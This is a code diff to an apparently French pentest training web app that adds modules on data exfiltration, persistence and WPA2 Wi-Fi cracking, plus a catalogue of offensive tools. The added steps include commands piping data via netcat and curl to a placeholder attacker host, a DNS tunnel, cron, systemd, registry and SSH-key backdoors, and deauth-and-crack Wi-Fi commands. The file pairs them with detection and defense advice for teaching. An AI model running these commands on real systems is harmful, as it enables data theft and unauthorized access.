@@ -1010,6 +1010,47 @@ document.addEventListener('DOMContentLoaded', () => {
             defense: 'Comptes de service avec mots de passe longs (gMSA), tiering administratif, surveillance LDAP/Kerberos, principe du moindre privilège.'
         },
         {
+            id: 'exfiltration', title: 'Exfiltration de données', icon: 'lucide:upload-cloud', color: 'blue',
+            context: 'Après compromission, objectif : sortir les données du réseau sans déclencher d\'alerte. On privilégie des canaux qui se fondent dans le trafic légitime.',
+            att: ['T1048', 'T1567.002', 'T1041'],
+            steps: [
+                { cmd: 'python3 -m http.server 8000', explain: 'Héberger un serveur côté attaquant pour récupérer les fichiers poussés par la cible (simple, mais en clair).' },
+                { cmd: 'tar czf - /data | nc <attaquant> 4444', explain: 'Compresser puis envoyer un dossier entier vers un listener netcat.' },
+                { cmd: 'curl -F "f=@secret.zip" https://ton-serveur/up', explain: 'Exfiltrer via HTTPS : le trafic chiffré se fond dans la navigation web normale.' },
+                { cmd: 'dnscat2 --dns domain=exfil.exemple.com', explain: 'Tunnel DNS quand le HTTP sortant est filtré : lent mais très discret.' }
+            ],
+            detection: 'Volumes sortants inhabituels, requêtes DNS anormalement longues/nombreuses, connexions vers des domaines inconnus, archives créées juste avant l\'envoi.',
+            defense: 'DLP, filtrage du trafic sortant (egress), inspection TLS, surveillance du volume et de l\'entropie DNS, segmentation réseau.'
+        },
+        {
+            id: 'persistence', title: 'Persistance (maintenir l\'accès)', icon: 'lucide:anchor', color: 'purple',
+            context: 'Conserver un accès après un redémarrage ou une déconnexion, sans avoir à ré-exploiter la cible. À démontrer uniquement sur tes propres machines.',
+            att: ['T1053', 'T1547.001', 'T1543', 'T1098.004'],
+            steps: [
+                { cmd: '(crontab -l 2>/dev/null; echo "* * * * * /tmp/.x") | crontab -', explain: 'Linux : tâche cron qui relance un implant à intervalle régulier.' },
+                { cmd: 'systemctl enable --now backdoor.service', explain: 'Linux : service systemd démarré automatiquement au boot.' },
+                { cmd: 'schtasks /create /tn Updater /tr payload.exe /sc onlogon', explain: 'Windows : tâche planifiée exécutée à chaque ouverture de session.' },
+                { cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d payload.exe', explain: 'Windows : clé Run lancée à la connexion de l\'utilisateur.' },
+                { cmd: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys', explain: 'Accès SSH persistant sans mot de passe via une clé publique ajoutée.' }
+            ],
+            detection: 'Nouvelles tâches/services, clés de registre Run modifiées, clés SSH ajoutées, nouveaux comptes, écarts par rapport à une baseline.',
+            defense: 'Surveillance d\'intégrité (osquery, autoruns), alertes sur création de tâches/services, moindre privilège, revue régulière des accès.'
+        },
+        {
+            id: 'wifi', title: 'Audit Wi-Fi WPA2', icon: 'lucide:wifi', color: 'emerald',
+            context: 'Tester la robustesse de TON réseau Wi-Fi : capturer le handshake WPA2 puis tenter de le casser hors-ligne. Attaquer un réseau tiers est illégal.',
+            att: ['T1040', 'T1110.002'],
+            steps: [
+                { cmd: 'sudo airmon-ng start wlan0', explain: 'Passer la carte Wi-Fi en mode monitor (écoute passive).' },
+                { cmd: 'sudo airodump-ng wlan0mon', explain: 'Lister les réseaux et repérer le BSSID et le canal de ta box.' },
+                { cmd: 'sudo airodump-ng -c <canal> --bssid <bssid> -w capture wlan0mon', explain: 'Capturer sur le bon canal en attendant qu\'un client se (re)connecte.' },
+                { cmd: 'sudo aireplay-ng --deauth 5 -a <bssid> wlan0mon', explain: 'Déauthentifier brièvement un client pour forcer un handshake (sur ton réseau).' },
+                { cmd: 'aircrack-ng capture.cap -w rockyou.txt', explain: 'Casser la clé WPA2 hors-ligne par dictionnaire.' }
+            ],
+            detection: 'Rafales de trames de déauthentification, clients déconnectés sans raison, points d\'accès jumeaux (evil twin).',
+            defense: 'WPA3 ou passphrase longue et aléatoire, 802.11w (trames de gestion protégées), WIDS Wi-Fi, séparation des SSID invités.'
+        },
+        {
             id: 'lab-scenario', title: 'Scénario lab complet (fil rouge)', icon: 'lucide:flag', color: 'red',
             context: 'Enchaînement type d\'un lab (HackTheBox/TryHackMe) : de la découverte au root, en reliant les modules de NetCmd Pro.',
             att: ['T1595', 'T1190', 'T1068'],
@@ -1164,8 +1205,88 @@ document.addEventListener('DOMContentLoaded', () => {
         // --- C2 & post-exploitation ---
         { name: 'mimikatz', cat: 'C2 & post-exploit', purpose: 'Extraction d\'identifiants Windows depuis la mémoire (hash, tickets Kerberos).', use: 'sekurlsa::logonpasswords', kw: ['credential', 'windows', 'hash', 'kerberos', 'post-exploit', 'lsass'], att: ['T1003.001'], note: 'Technique sensible : labs / cibles autorisées.' },
         { name: 'Sliver / Havoc', cat: 'C2 & post-exploit', purpose: 'Frameworks de command-and-control pour piloter des implants lors d\'un engagement red team.', use: 'Générer un implant + session C2', kw: ['c2', 'command control', 'implant', 'red team', 'post-exploit'], att: ['T1071'], note: 'Usage red team autorisé uniquement.' },
-        { name: 'LaZagne', cat: 'C2 & post-exploit', purpose: 'Récupère les mots de passe stockés localement (navigateurs, Wi-Fi, logiciels).', use: 'lazagne.exe all', kw: ['credential', 'mot de passe', 'post-exploit', 'local'], att: ['T1555'], note: 'Sur une machine que tu contrôles / cible autorisée.' }
+        { name: 'LaZagne', cat: 'C2 & post-exploit', purpose: 'Récupère les mots de passe stockés localement (navigateurs, Wi-Fi, logiciels).', use: 'lazagne.exe all', kw: ['credential', 'mot de passe', 'post-exploit', 'local'], att: ['T1555'], note: 'Sur une machine que tu contrôles / cible autorisée.' },
+
+        // --- Ajouts : reconnaissance / scan / web ---
+        { name: 'Amass', cat: 'Reconnaissance', purpose: 'Cartographie de surface d\'attaque et énumération exhaustive de sous-domaines.', use: 'amass enum -d exemple.com', kw: ['osint', 'sous-domaine', 'surface', 'reconnaissance'], att: ['T1590.005'], url: 'https://github.com/owasp-amass/amass' },
+        { name: 'recon-ng', cat: 'Reconnaissance', purpose: 'Framework de reconnaissance web modulaire (l\'équivalent de Metasploit pour l\'OSINT).', use: 'recon-ng', kw: ['osint', 'framework', 'reconnaissance'], att: ['T1593'], url: 'https://github.com/lanmaster53/recon-ng' },
+        { name: 'naabu', cat: 'Scan & réseau', purpose: 'Scanner de ports rapide et scriptable (ProjectDiscovery).', use: 'naabu -host 10.10.10.5', kw: ['scan', 'port', 'rapide'], att: ['T1046'], url: 'https://github.com/projectdiscovery/naabu' },
+        { name: 'nuclei', cat: 'Web', purpose: 'Scanner de vulnérabilités basé sur des templates communautaires (CVE, mauvaises configs).', use: 'nuclei -u http://cible', kw: ['web', 'vulnerabilite', 'cve', 'scan', 'template'], att: ['T1595.002'], url: 'https://github.com/projectdiscovery/nuclei' },
+        { name: 'feroxbuster', cat: 'Web', purpose: 'Brute-force récursif et rapide de contenu web (écrit en Rust).', use: 'feroxbuster -u http://cible', kw: ['web', 'fuzzing', 'repertoire', 'recursif'], att: ['T1595.003'], url: 'https://github.com/epi052/feroxbuster' },
+        { name: 'XSStrike', cat: 'Web', purpose: 'Détection et exploitation de failles XSS avec analyse du contexte d\'injection.', use: 'xsstrike -u "http://cible/?q=1"', kw: ['web', 'xss', 'injection', 'script'], att: ['T1059.007'], url: 'https://github.com/s0md3v/XSStrike', note: 'Cible autorisée uniquement.' },
+        { name: 'medusa', cat: 'Mots de passe', purpose: 'Brute-force d\'authentification réseau massivement parallèle (alternative à hydra).', use: 'medusa -h cible -u admin -P liste.txt -M ssh', kw: ['bruteforce', 'login', 'mot de passe', 'ssh'], att: ['T1110.001'], url: 'https://github.com/jmk-foofus/medusa', note: 'Sur tes propres services.' },
+
+        // --- Ajouts : privesc / Active Directory ---
+        { name: 'LOLBAS', cat: 'Élévation de privilèges', purpose: 'Base de binaires Windows légitimes détournables (exécution, téléchargement, bypass).', use: 'Chercher sur lolbas-project.github.io', kw: ['privesc', 'windows', 'binaire', 'contournement', 'lolbin'], att: ['T1218'], url: 'https://lolbas-project.github.io' },
+        { name: 'Rubeus', cat: 'Active Directory', purpose: 'Boîte à outils Kerberos (Kerberoasting, AS-REP roasting, pass-the-ticket).', use: 'Rubeus.exe kerberoast', kw: ['ad', 'kerberos', 'ticket', 'roasting', 'windows'], att: ['T1558.003'], url: 'https://github.com/GhostPack/Rubeus', note: 'Engagement autorisé uniquement.' },
+        { name: 'Certipy', cat: 'Active Directory', purpose: 'Énumération et abus des services de certificats AD (AD CS, ESC1-8).', use: 'certipy find -u user@dom -p pass', kw: ['ad', 'adcs', 'certificat', 'escalade'], att: ['T1649'], url: 'https://github.com/ly4k/Certipy' },
+        { name: 'enum4linux-ng', cat: 'Active Directory', purpose: 'Énumération SMB/LDAP (partages, utilisateurs, politiques) — version modernisée.', use: 'enum4linux-ng -A cible', kw: ['smb', 'ldap', 'enumeration', 'ad', 'partage'], att: ['T1087.002'], url: 'https://github.com/cddmp/enum4linux-ng' },
+
+        // --- Ajouts : exfiltration ---
+        { name: 'dnscat2', cat: 'Exfiltration', purpose: 'Canal de commande et d\'exfiltration tunnelé dans le protocole DNS (discret).', use: 'dnscat2 --dns domain=exfil.exemple.com', kw: ['exfiltration', 'dns', 'tunnel', 'c2', 'discret'], att: ['T1048.003', 'T1071.004'], url: 'https://github.com/iagox86/dnscat2', note: 'Démonstration / lab autorisé uniquement.' },
+        { name: 'rclone', cat: 'Exfiltration', purpose: 'Synchronisation vers le cloud — légitime pour les sauvegardes, détourné pour exfiltrer des données.', use: 'rclone copy /data remote:bucket', kw: ['exfiltration', 'cloud', 'transfert', 'sync', 'donnees'], att: ['T1567.002'], url: 'https://rclone.org' },
+        { name: 'croc', cat: 'Exfiltration', purpose: 'Transfert de fichiers chiffré de machine à machine, simple et relayé.', use: 'croc send fichier', kw: ['exfiltration', 'transfert', 'fichier', 'chiffre'], att: ['T1048'], url: 'https://github.com/schollz/croc' },
+
+        // --- Ajouts : persistance ---
+        { name: 'Empire', cat: 'Persistance', purpose: 'Framework post-exploitation C2 riche en modules de persistance (PowerShell/Python).', use: 'Listener + agent', kw: ['persistance', 'c2', 'post-exploit', 'powershell'], att: ['T1547', 'T1053'], url: 'https://github.com/BC-SECURITY/Empire', note: 'Engagement red team autorisé uniquement.' },
+        { name: 'SharPersist', cat: 'Persistance', purpose: 'Boîte à outils de persistance Windows (tâches planifiées, services, clés de registre).', use: 'SharPersist -t schtask -c payload', kw: ['persistance', 'windows', 'registre', 'tache', 'service'], att: ['T1053.005', 'T1547.001'], url: 'https://github.com/mandiant/SharPersist', note: 'Lab / engagement autorisé.' },
+
+        // --- Ajouts : wireless / forensics ---
+        { name: 'wifite', cat: 'Wireless', purpose: 'Automatise l\'audit Wi-Fi (handshakes, WPS, attaques) autour de la suite aircrack.', use: 'wifite', kw: ['wifi', 'wireless', 'handshake', 'automatique', 'sans-fil'], att: ['T1040'], url: 'https://github.com/kimocoder/wifite2', note: 'Uniquement ton propre réseau.' },
+        { name: 'hcxdumptool', cat: 'Wireless', purpose: 'Capture de PMKID / handshakes WPA en vue d\'un cassage hors-ligne.', use: 'hcxdumptool -i wlan0 -o capture.pcapng', kw: ['wifi', 'wireless', 'pmkid', 'wpa', 'handshake'], att: ['T1040'], url: 'https://github.com/ZerBea/hcxdumptool', note: 'Uniquement ton propre réseau.' },
+        { name: 'Reaver', cat: 'Wireless', purpose: 'Attaque par force brute du PIN WPS des points d\'accès.', use: 'reaver -i wlan0 -b <bssid>', kw: ['wifi', 'wps', 'bruteforce', 'sans-fil'], att: ['T1110'], url: 'https://github.com/t6x/reaver-wps-fork-t6x', note: 'Uniquement ton propre réseau.' },
+        { name: 'exiftool', cat: 'Forensics & stégano', purpose: 'Lit et modifie les métadonnées de fichiers (images, docs) — OSINT / forensics.', use: 'exiftool image.jpg', kw: ['forensics', 'metadonnees', 'osint', 'image', 'exif'], att: ['T1592'], url: 'https://exiftool.org' },
+        { name: 'Autopsy', cat: 'Forensics & stégano', purpose: 'Plateforme graphique d\'investigation numérique (disques, fichiers supprimés, timeline).', use: 'Interface graphique Autopsy', kw: ['forensics', 'investigation', 'disque', 'timeline'], att: [], url: 'https://www.autopsy.com' }
     ];
+
+    // Liens officiels des outils déjà présents sans champ url (par nom exact)
+    const arsenalLinks = {
+        'theHarvester': 'https://github.com/laramies/theHarvester',
+        'whois': 'https://www.whois.com/whois/',
+        'dnsrecon / dig': 'https://github.com/darkoperator/dnsrecon',
+        'Shodan': 'https://www.shodan.io',
+        'nmap': 'https://nmap.org',
+        'masscan': 'https://github.com/robertdavidgraham/masscan',
+        'rustscan': 'https://github.com/RustScan/RustScan',
+        'netdiscover': 'https://github.com/netdiscover-scanner/netdiscover',
+        'gobuster / ffuf': 'https://github.com/ffuf/ffuf',
+        'nikto': 'https://github.com/sullo/nikto',
+        'Burp Suite': 'https://portswigger.net/burp',
+        'sqlmap': 'https://sqlmap.org',
+        'wpscan': 'https://wpscan.com',
+        'hashcat': 'https://hashcat.net/hashcat/',
+        'John the Ripper': 'https://www.openwall.com/john/',
+        'hydra': 'https://github.com/vanhauser-thc/thc-hydra',
+        'CeWL': 'https://github.com/digininja/CeWL',
+        'LinPEAS': 'https://github.com/peass-ng/PEASS-ng',
+        'WinPEAS': 'https://github.com/peass-ng/PEASS-ng',
+        'GTFOBins': 'https://gtfobins.github.io',
+        'pspy': 'https://github.com/DominicBreuker/pspy',
+        'BloodHound': 'https://github.com/SpecterOps/BloodHound',
+        'CrackMapExec': 'https://github.com/Pennyw0rth/NetExec',
+        'impacket': 'https://github.com/fortra/impacket',
+        'Responder': 'https://github.com/lgandx/Responder',
+        'Metasploit': 'https://www.metasploit.com',
+        'searchsploit': 'https://www.exploit-db.com/searchsploit',
+        'msfvenom': 'https://www.metasploit.com',
+        'chisel': 'https://github.com/jpillora/chisel',
+        'ligolo-ng': 'https://github.com/nicocha30/ligolo-ng',
+        'proxychains': 'https://github.com/rofl0r/proxychains-ng',
+        'Wireshark': 'https://www.wireshark.org',
+        'tcpdump': 'https://www.tcpdump.org',
+        'bettercap': 'https://www.bettercap.org',
+        'aircrack-ng': 'https://www.aircrack-ng.org',
+        'Kismet': 'https://www.kismetwireless.net',
+        'Volatility': 'https://www.volatilityfoundation.org',
+        'binwalk': 'https://github.com/ReFirmLabs/binwalk',
+        'steghide': 'https://steghide.sourceforge.net',
+        'hping3': 'http://www.hping.org',
+        'slowhttptest': 'https://github.com/shekyan/slowhttptest',
+        'Locust / wrk': 'https://locust.io',
+        'mimikatz': 'https://github.com/gentilkiwi/mimikatz',
+        'Sliver / Havoc': 'https://github.com/BishopFox/sliver',
+        'LaZagne': 'https://github.com/AlessandroZ/LaZagne'
+    };
 
     let arsenalWired = false;
     let arsenalActiveCat = 'Tous';
@@ -1205,6 +1326,8 @@ document.addEventListener('DOMContentLoaded', () => {
                     md += '## ' + t.name + '  _(' + t.cat + ')_\n\n';
                     md += t.purpose + '\n\n';
                     md += '- **Usage :** `' + t.use + '`\n';
+                    const u = t.url || arsenalLinks[t.name];
+                    if (u) md += '- **Lien :** ' + u + '\n';
                     if (t.att && t.att.length) md += '- **ATT&CK :** ' + t.att.join(', ') + '\n';
                     if (t.note) md += '- **Note :** ' + t.note + '\n';
                     md += '\n';
@@ -1248,9 +1371,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 ? '<div class="mt-2 text-[10px] text-amber-300/80 bg-amber-500/5 border border-amber-500/15 rounded px-2 py-1 flex items-start gap-1"><iconify-icon icon="lucide:alert-triangle" width="12" class="mt-0.5 shrink-0"></iconify-icon><span>' + escapeHtml(t.note) + '</span></div>'
                 : '';
             const useId = 'ars-' + Math.random().toString(36).slice(2, 9);
+            const url = t.url || arsenalLinks[t.name] || '';
+            const link = url ? '<a href="' + escapeHtml(url) + '" target="_blank" rel="noopener noreferrer" class="text-zinc-500 hover:text-accent-400 transition-colors shrink-0" title="Site officiel"><iconify-icon icon="lucide:external-link" width="12"></iconify-icon></a>' : '';
             return '<div class="bg-zinc-900/20 border border-zinc-800 rounded-xl p-4 flex flex-col hover:border-zinc-700 transition-colors">' +
                 '<div class="flex items-center justify-between gap-2 mb-1">' +
-                    '<h3 class="text-sm font-semibold text-white font-mono">' + escapeHtml(t.name) + '</h3>' +
+                    '<div class="flex items-center gap-1.5 min-w-0"><h3 class="text-sm font-semibold text-white font-mono truncate">' + escapeHtml(t.name) + '</h3>' + link + '</div>' +
                     '<span class="text-[9px] text-zinc-400 border border-zinc-800 bg-zinc-800/40 px-1.5 py-0.5 rounded uppercase tracking-wide shrink-0">' + escapeHtml(t.cat) + '</span>' +
                 '</div>' +
                 '<p class="text-[11px] text-zinc-300 leading-relaxed flex-1">' + escapeHtml(t.purpose) + '</p>' +
